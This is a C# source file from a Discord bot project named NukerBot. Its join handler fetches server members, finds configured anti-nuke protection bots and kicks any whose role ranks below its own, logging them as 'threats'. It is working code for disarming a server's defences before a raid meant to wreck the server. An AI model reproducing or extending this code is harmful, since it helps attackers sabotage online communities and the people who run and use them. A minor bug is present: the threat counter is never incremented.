using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.Entities;
using DSharpPlus.EventArgs;
using Microsoft.Extensions.DependencyInjection;
using NukerBot.src.Core.Entities;

namespace NukerBot.src.Core.Events;

[DiscordEvent]
public static class GuildCreated
{
    public static async Task MainAsync(DiscordClient client, GuildCreateEventArgs args)
    {
        var commandsNext = client.GetCommandsNext();
        var config = commandsNext.Services.GetRequiredService<Config>();

        var guild = args.Guild;

        var members = await guild.GetAllMembersAsync();
        var myRole = guild.CurrentMember.Roles.First();

        // anti-nuke bot detection

        var protectionBots = config.Nuking.Options.ProtectionBots
            .Select(async bot =>
            {
                try
                {
                    var member = members.FirstOrDefault(m => m.Id == bot.ID);

                    return member ?? await ProtectionBot.ToDiscordMemberAsync(bot, guild);
                }
                catch
                {
                    return null;
                }
            });

        List<DiscordMember> foundBots = [];

        int count = 0;

        foreach (DiscordMember? bot in await Task.WhenAll(protectionBots))
        {
            if (bot is null)
            {
                continue;
            }

            var botRole = bot.Roles.First();

            if (botRole is null || myRole.Position > botRole.Position)
            {
                await bot.RemoveAsync();
            }

            foundBots.Add(bot);
        }

        Console.WriteLine($"Found {count} threats: {string.Join(", ", foundBots)}");

        await Task.CompletedTask;
    }
}
